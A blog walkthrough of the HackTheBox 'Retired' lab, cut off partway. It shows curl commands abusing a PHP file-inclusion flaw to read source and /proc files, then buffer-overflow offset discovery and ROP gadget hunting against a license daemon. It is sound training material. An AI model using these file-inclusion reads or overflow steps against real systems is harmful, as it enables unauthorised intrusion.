<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HackTheBox - Retired" /><meta property="og:locale" content="en" /><meta name="description" content="HTB - Retired walkthrough" /><meta property="og:description" content="HTB - Retired walkthrough" /><link rel="canonical" href="https://jayden-lind.github.io/posts/htb-retired/" /><meta property="og:url" content="https://jayden-lind.github.io/posts/htb-retired/" /><meta property="og:site_name" content="Jayden Lind - Portfolio" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-22T00:00:00+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Retired" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-23T00:06:40+11:00","datePublished":"2022-06-22T00:00:00+10:00","description":"HTB - Retired walkthrough","headline":"HackTheBox - Retired","mainEntityOfPage":{"@type":"WebPage","@id":"https://jayden-lind.github.io/posts/htb-retired/"},"url":"https://jayden-lind.github.io/posts/htb-retired/"}</script><title>HackTheBox - Retired | Jayden Lind - Portfolio</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Jayden Lind - Portfolio"><meta name="application-name" content="Jayden Lind - Portfolio"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://jayden-lind.github.io/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Jayden Lind - Portfolio</a></div><div class="site-subtitle font-italic">Homelab, Software Engineering, Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/homelab/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>HOMELAB</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/jayden-lind" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['jayden','linds.com.au'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/jayden-lind/" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Retired</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox - Retired</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1655820000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 22, 2022 </em> </span> <span> Updated <em class="" data-ts="1679490400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 23, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/jayden-lind">jayden-lind</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2820 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><h1 id="htb---retired-walkthrough">HTB - Retired walkthrough</h1><p><a href="/img/2022/06/Retired.png" class="popup img-link "><img data-src="/img/2022/06/Retired.png" alt="image" class="lazyload" data-proofer-ignore></a></p><p>Retired box is a medium rated difficulty box, but for me personally it was a hard box. I’ve never done any sort of binary exploitation before and because of that, this box took me a good 30+ hours to solve.</p><p>I overall found this really fun, and I’m glad I did this box, as I learned a lot about binary exploitation, even if it was only a specific type.</p><h2 id="initial"><span class="mr-2">Initial</span><a href="#initial" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Start with nmap scan on the remote host: <code class="language-plaintext highlighter-rouge">10.10.11.154</code></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$nmap</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.11.154
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-06-21 22:45 AEST
Nmap scan report <span class="k">for </span>10.10.11.154
Host is up <span class="o">(</span>0.015s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page<span class="o">=</span>default.html
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>18.65 seconds
</pre></table></code></div></div><p>Let’s checkout the webpage, which redirects us to <code class="language-plaintext highlighter-rouge">http://10.10.11.154/index.php?page=default.html</code>.</p><p>This looks like a LFI (Local File Inclusion) straight away. Let’s FUZZ this and find some pages.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ffuf</span> <span class="nt">-u</span> http://10.10.11.154/index.php?page<span class="o">=</span>FUZZ.html <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-t</span> 10 <span class="nt">-fs</span> 0 <span class="nt">-s</span>
default
beta
</pre></table></code></div></div><p>We can see a beta.html, which allows us to upload a license file. Intercepting the upload request through burpsuite, we can see it POST’s to <code class="language-plaintext highlighter-rouge">activate_license.php</code>.</p><p><a href="/img/2022/06/image-5.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-5.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>Now let’s try to leverage what appears to be this LFI, and grab the <code class="language-plaintext highlighter-rouge">index.php</code>, <code class="language-plaintext highlighter-rouge">activate_license.php</code> and <code class="language-plaintext highlighter-rouge">beta.php</code></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$curl</span> http://10.10.11.154/index.php?page<span class="o">=</span>php://filter/resource<span class="o">=</span>index.php
&lt;?php
<span class="k">function </span>sanitize_input<span class="o">(</span><span class="nv">$param</span><span class="o">)</span> <span class="o">{</span>
    <span class="nv">$param1</span> <span class="o">=</span> str_replace<span class="o">(</span><span class="s2">"../"</span>,<span class="s2">""</span>,<span class="nv">$param</span><span class="o">)</span><span class="p">;</span>
    <span class="nv">$param2</span> <span class="o">=</span> str_replace<span class="o">(</span><span class="s2">"./"</span>,<span class="s2">""</span>,<span class="nv">$param1</span><span class="o">)</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$param2</span><span class="p">;</span>
<span class="o">}</span>
<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]</span><span class="p">;</span>
<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$page</span><span class="o">)</span> <span class="o">&amp;&amp;</span> preg_match<span class="o">(</span><span class="s2">"/^[a-z]/"</span>, <span class="nv">$page</span><span class="o">))</span> <span class="o">{</span>
    <span class="nv">$page</span> <span class="o">=</span> sanitize_input<span class="o">(</span><span class="nv">$page</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
    header<span class="o">(</span><span class="s1">'Location: /index.php?page=default.html'</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
readfile<span class="o">(</span><span class="nv">$page</span><span class="o">)</span><span class="p">;</span>
?&gt;
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$curl</span> http://10.10.11.154/index.php?page<span class="o">=</span>php://filter/resource<span class="o">=</span>activate_license.php <span class="nt">--output</span> -
&lt;?php
<span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'licensefile'</span><span class="o">]))</span> <span class="o">{</span>
    <span class="nv">$license</span>      <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'licensefile'</span><span class="o">][</span><span class="s1">'tmp_name'</span><span class="o">])</span><span class="p">;</span>
    <span class="nv">$license_size</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="o">[</span><span class="s1">'licensefile'</span><span class="o">][</span><span class="s1">'size'</span><span class="o">]</span><span class="p">;</span>
    <span class="nv">$socket</span> <span class="o">=</span> socket_create<span class="o">(</span>AF_INET, SOCK_STREAM, SOL_TCP<span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(!</span><span class="nv">$socket</span><span class="o">)</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">"error socket_create()</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="o">}</span>
    <span class="k">if</span> <span class="o">(!</span>socket_connect<span class="o">(</span><span class="nv">$socket</span>, <span class="s1">'127.0.0.1'</span>, 1337<span class="o">))</span> <span class="o">{</span>
        <span class="nb">echo</span> <span class="s2">"error socket_connect()"</span> <span class="nb">.</span> socket_strerror<span class="o">(</span>socket_last_error<span class="o">())</span> <span class="nb">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="o">}</span>
    socket_write<span class="o">(</span><span class="nv">$socket</span>, pack<span class="o">(</span><span class="s2">"N"</span>, <span class="nv">$license_size</span><span class="o">))</span><span class="p">;</span>
    socket_write<span class="o">(</span><span class="nv">$socket</span>, <span class="nv">$license</span><span class="o">)</span><span class="p">;</span>
    socket_shutdown<span class="o">(</span><span class="nv">$socket</span><span class="o">)</span><span class="p">;</span>
    socket_close<span class="o">(</span><span class="nv">$socket</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
?&gt;
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$curl</span> http://10.10.11.154/index.php?page<span class="o">=</span>php://filter/resource<span class="o">=</span>/proc/self/cmdline <span class="nt">--output</span> -
php-fpm: pool www
</pre></table></code></div></div><p>We have LFI, and can now look for other running processes by enumerating through /proc/PID/cmdline, and we can automate this through a quick python script that I wrote <a href="https://github.com/Jayden-Lind/HTB-Retired/blob/master/pid_scanner.py">PID Scanner</a>.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$python</span> pid_scanner.py 
401
/usr/bin/activate_license1337
545
nginx: worker process
546
nginx: worker process
561
php-fpm: pool www
562
php-fpm: pool www
</pre></table></code></div></div><p>The interesting process from this output, is this PID of 401 with the cmdline of /usr/bin/activate_license 1337. Let’s pull this binary down through the LFI, try to play around with it, and then open it up through Ghidra to try and understand it.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$curl</span> http://10.10.11.154/index.php?page<span class="o">=</span>php://filter/resource<span class="o">=</span>/proc/401/exe <span class="nt">--output</span> activate_license
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 22536 0 22536 0 0 400k 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 400
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$.</span>/activate_license
Error: specify port to <span class="nb">bind </span>to
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$.</span>/activate_license 1337
<span class="o">[</span>+] starting server listening on port 1337
<span class="o">[</span>+] listening …
</pre></table></code></div></div><p>Using <a href="https://docs.pwntools.com/en/stable/">pwntools</a> we can check if there’s any quick and easy avenues on this particular binary. Which based on the output below, shows no easy wins.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$pwn</span> checksec activate_license
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/jayden/ctf/retired/activate_license'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></table></code></div></div><p>We can open this up in Ghidra and see what this binary is actually doing.</p><p><a href="/img/2022/06/image-1.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-1.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>The main function is just setting up the socket to listen to, which we can see in activate_license.php, as it connects to a socket on port 1337. Now lets checkout the activate_license function.</p><p><a href="/img/2022/06/image-2.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 65% 65%'%3E%3C/svg%3E" data-src="/img/2022/06/image-2.png" alt="image" height="65%" width="65%" class="lazyload" data-proofer-ignore></a></p><p>Through the Ghidra screenshots we can see that in line 14 of activate_license function, it reads the first 4 bytes of this first message in the socket and updates the msglen buffer to that result.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sVar2 = read(sockfd,&amp;msglen,4);
</pre></table></code></div></div><p>Later down on line 22 it then reads the second message from this socket, and reads <code class="language-plaintext highlighter-rouge">msglen</code> length from the socket into the buffer BUT this buffer is only 512 char long. This will allow us to overflow later.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sVar2 = read(sockfd,buffer,(ulong)msglen);
</pre></table></code></div></div><p>By researching up on binary exploitation, John Hammonds <a href="https://www.youtube.com/watch?v=i5-cWI_HV8o&amp;t=896s">Video</a> explains the idea of ROP (Return Oriented Programming) really well. Our binary is different from this example, but we can use this as a basis point.</p><p>What we can do is look at using this overflow to then bypass the NX (No eXecute) on the stack by calling mprotect() on the stack address space, making the stack executable. An okay example of this is <a href="https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/">Bypass NX with mprotect</a>, but the instructions skip over some steps, and dont explain enough of the steps.</p><p>But this is not enough, as we need a way to execute the stack, and that can be done with a “jmp rsp” (jump to stack pointer) and we can use the <a href="https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp">jmp rsp</a> instructionsto execute what we put on the stack.</p><h3 id="high-level-overview"><span class="mr-2">High Level Overview:</span><a href="#high-level-overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We need to get the address of mprotect on the stack, the return addresses to pop the parameters we want to use in mprotect() in the stack, so that mprotect() can then be executed to make the stack executable and then execute our code through a jmp rsp instruction.</p><p>First we need to find the offset, which will allow us to cleanly put what we want on the stack. This can be seen in <a href="https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/">Bypass NX with mprotect</a>. I can see that the offset ends up being 520 bytes (convenient 512 + 8 Bytes).</p><p>Script to find offset - <a href="https://github.com/Jayden-Lind/HTB-Retired/blob/master/pwntool-test.py">pwntool-test.py</a></p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre>pwndbg&gt; 
Temporary breakpoint 9 at 0x555555555370: file activate_license.c, line 23.
<span class="o">[</span>+] reading 1000 bytes
<span class="o">[</span>+] activated license: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thread 2.1 <span class="s2">"activate_licens"</span> received signal SIGSEGV, Segmentation fault.
0x00005555555555c0 <span class="k">in </span>activate_license <span class="o">(</span><span class="nv">sockfd</span><span class="o">=</span>4<span class="o">)</span> at activate_license.c:64
64      <span class="k">in </span>activate_license.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS <span class="o">]</span>─────────────────────────────────────────────────────────────────────
<span class="k">*</span>RAX  0x260
 RBX  0x0
<span class="k">*</span>RCX  0x0
<span class="k">*</span>RDX  0x7ffff7b380c0 ◂— 0x7ffff7b380c0
<span class="k">*</span>RDI  0x7fffffffd790 —▸ 0x7ffff7cfd090 <span class="o">(</span>funlockfile<span class="o">)</span> ◂— mov    rdi, qword ptr <span class="o">[</span>rdi + 0x88]
<span class="k">*</span>RSI  0x0
<span class="k">*</span>R8   0xfffffffffffffff7
<span class="k">*</span>R9   0x260
<span class="k">*</span>R10  0x7fffffffdd20 ◂— 0x4343434343434343 <span class="o">(</span><span class="s1">'CCCCCCCC'</span><span class="o">)</span>
 R11  0x246
 R12  0x555555555220 <span class="o">(</span>_start<span class="o">)</span> ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
<span class="k">*</span>RBP  0x4343434343434343 <span class="o">(</span><span class="s1">'CCCCCCCC'</span><span class="o">)</span>
<span class="k">*</span>RSP  0x7fffffffdf28 ◂— <span class="s1">'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'</span>
<span class="k">*</span>RIP  0x5555555555c0 <span class="o">(</span>activate_license+643<span class="o">)</span> ◂— ret    
──────────────────────────────────────────────────────────────────────[ DISASM <span class="o">]</span>──────────────────────────────────────────────────────────────────────
 ► 0x5555555555c0 &lt;activate_license+643&gt;    ret    &lt;0x4444444444444444&gt;





──────────────────────────────────────────────────────────────────────[ STACK <span class="o">]</span>───────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf28 ◂— <span class="s1">'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'</span>
... ↓        7 skipped
────────────────────────────────────────────────────────────────────[ BACKTRACE <span class="o">]</span>─────────────────────────────────────────────────────────────────────
 ► f 0   0x5555555555c0 activate_license+643
   f 1 0x4444444444444444
   f 2 0x4444444444444444
   f 3 0x4444444444444444
   f 4 0x4444444444444444
   f 5 0x4444444444444444
   f 6 0x4444444444444444
   f 7 0x4444444444444444
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; 
</pre></table></code></div></div><p>We then just follow the same instructions as <a href="https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/">Bypass NX with mprotect</a> but with some exceptions. We will use the libc and sqlite3 library to help us with some of the stack pops and the eventual “jmp rsp”. The likelihood that a library will have the “jmp rsp” instruction anywhere is unlikely, but luckily sqlite3 does have it.</p><p>Now let’s find these stack pops, libc address and the mprotect() address.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$gdb</span> activate_license 
Reading symbols from activate_license...
pwndbg&gt; <span class="nb">set </span>args 1337
pwndbg&gt; run
Starting program: /home/jayden/ctf/retired/activate_license 1337
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
<span class="o">[</span>+] starting server listening on port 1337
<span class="o">[</span>+] listening ...
^C
Program received signal SIGINT, Interrupt.
pwndbg&gt; p mprotect 
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x7ffff7d9dc20 &lt;mprotect&gt;
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ROPgadget</span> <span class="nt">--binary</span> activate_license | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"pop rdi"</span>
0x000000000000181b : pop rdi <span class="p">;</span> ret
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ROPgadget</span> <span class="nt">--binary</span> /lib/x86_64-linux-gnu/libc-2.31.so | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"pop rsi ; ret"</span>
0x000000000002890f : pop rsi <span class="p">;</span> ret
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ROPgadget</span> <span class="nt">--binary</span> /lib/x86_64-linux-gnu/libc-2.31.so | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"pop rdx ; ret"</span>
0x00000000000cb1cd : pop rdx <span class="p">;</span> ret
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ <span class="nv">$ROPgadget</span> <span class="nt">--binary</span> /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"jmp rsp"</span>
0x00000000000d431d : jmp rsp
</pre></table></code></div></div><p>We now have the offsets needed, but require the libc base address, libsqlite3 base address. We can grab this from running vmmap inside gdb when the process is running, and grab the first occurence of the loaded module, and that is the base address of this module on the local system.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
....
